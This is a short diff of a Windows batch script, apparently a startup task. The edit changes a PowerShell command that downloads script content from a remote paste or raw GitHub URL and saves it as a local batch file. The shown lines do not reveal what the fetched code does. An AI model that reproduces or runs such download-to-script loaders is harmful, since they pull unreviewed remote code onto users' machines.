@@ -10,7 +10,7 @@ color 0A
 :StartupTask
 
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/STARTUPTASK/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/StartupTask') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
